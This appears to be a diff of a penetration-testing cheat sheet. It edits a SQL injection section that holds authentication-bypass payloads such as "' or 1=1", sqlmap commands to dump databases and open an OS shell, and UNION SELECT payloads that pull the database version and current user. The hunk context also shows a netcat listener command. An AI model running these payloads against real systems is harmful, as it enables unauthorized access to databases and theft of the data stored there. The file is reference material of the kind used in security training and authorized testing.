@@ -205,11 +205,7 @@ nc -nlvp 81
 [OWASP SQL Injection Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
 ```bash
 # Simple SQL Injection Authentication Bypass
-username: any' or 1=1 limit 1;#
-
-# Enter to a login page to check for SQL inj
-username: ' or '1' = '1'
-password: ' or '1' = '1' 
+username: any' or 1=1 limit 1;# '
 
 # run sql map on an injectable site 
 sqlmap -u "domain" --dump
@@ -217,6 +213,18 @@ sqlmap -u "domain" --dump
 sqlmap -u "domain" --os-shell
 sqlmap -u "domain" --tables
 
+# Extract information after SQL Injection established
+# Try combinations of the below, adding to injectable feilds  
+
+# show the first column
+order by 1 # then increment the 1 until there is an error message, this shows how many columns there are 
+union all select 1,2,3,4,5,N # where n represents the number of columns  
+#show databse version
+union all select 1,2,3,4,@@version,6,N
+#show current user 
+union all select 1,2,3,4,user(),6,N 
+
+# Using SQL for RCE 
 
 ```  
 ### XPath Injection  
